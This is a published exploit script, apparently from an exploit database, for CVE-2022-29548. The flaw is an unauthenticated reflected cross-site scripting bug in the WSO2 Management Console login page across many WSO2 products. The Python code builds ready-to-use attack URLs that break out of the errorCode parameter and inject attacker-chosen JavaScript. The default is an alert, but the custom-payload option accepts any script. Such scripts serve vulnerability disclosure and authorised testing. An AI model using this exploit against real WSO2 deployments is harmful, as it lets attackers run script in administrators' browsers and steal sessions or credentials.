# Exploit Title: WSO2 Management Console (Multiple Products) - Unauthenticated Reflected Cross-Site Scripting (XSS)
# Date: 21 Apr 2022
# Exploit Author: cxosmo
# Vendor Homepage: https://wso2.com
# Software Link: API Manager (https://wso2.com/api-manager/), Identity Server (https://wso2.com/identity-server/), Enterprise Integrator (https://wso2.com/integration/)
# Affected Version(s): API Manager 2.2.0, 2.5.0, 2.6.0, 3.0.0, 3.1.0, 3.2.0 and 4.0.0;
    # API Manager Analytics 2.2.0, 2.5.0, and 2.6.0;
    # API Microgateway 2.2.0;
    # Data Analytics Server 3.2.0;
    # Enterprise Integrator 6.2.0, 6.3.0, 6.4.0, 6.5.0, and 6.6.0;
    # IS as Key Manager 5.5.0, 5.6.0, 5.7.0, 5.9.0, and 5.10.0;
    # Identity Server 5.5.0, 5.6.0, 5.7.0, 5.9.0, 5.10.0, and 5.11.0;
    # Identity Server Analytics 5.5.0 and 5.6.0;
    # WSO2 Micro Integrator 1.0.0.
# Tested on: API Manager 4.0.0 (OS: Ubuntu 21.04; Browser: Chromium Version 99.0.4844.82)
# CVE: CVE-2022-29548

import argparse
import logging
import urllib.parse

# Global variables
VULNERABLE_ENDPOINT = "/carbon/admin/login.jsp?loginStatus=false&errorCode="
DEFAULT_PAYLOAD = "alert(document.domain)"

# Logging config
logging.basicConfig(level=logging.INFO, format="")
log = logging.getLogger()

def generate_payload(url, custom_payload=False):
    log.info(f"Generating payload for {url}...")
    if custom_payload:
        log.info(f"[+] GET-based reflected XSS payload: {url}{VULNERABLE_ENDPOINT}%27);{custom_payload}//")
    else:
        log.info(f"[+] GET-based reflected XSS payload: {url}{VULNERABLE_ENDPOINT}%27);{DEFAULT_PAYLOAD}//")

def clean_url_input(url):
    if url.count("/") > 2:
        return f"{url.split('/')[0]}//{url.split('/')[2]}"
    else:
        return url

def check_payload(payload):
    encoded_characters = ['"', '<', '>']
    if any(character in payload for character in encoded_characters):
        log.info(f"Unsupported character(s) (\", <, >) found in payload.")
        return False
    else:
        return urllib.parse.quote(payload)

if __name__ == "__main__":
    # Parse command line
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
    required_arguments = parser.add_argument_group('required arguments')
    required_arguments.add_argument("-t", "--target",
                        help="Target address {protocol://host} of vulnerable WSO2 application (e.g. https://localhost:9443)",
                        required="True", action="store")
    parser.add_argument("-p", "--payload",
                        help="Use custom JavaScript for generated payload (Some characters (\"<>) are HTML-entity encoded and therefore are unsupported). (Defaults to alert(document.domain))",
                        action="store", default=False)
    args = parser.parse_args()

    # Clean user target input
    args.target = clean_url_input(args.target.lower())

    # Check for unsupported characters in custom payload; URL-encode as required
    if args.payload:
        args.payload = check_payload(args.payload)
        if args.payload:
            generate_payload(args.target, args.payload)
    else:
        generate_payload(args.target)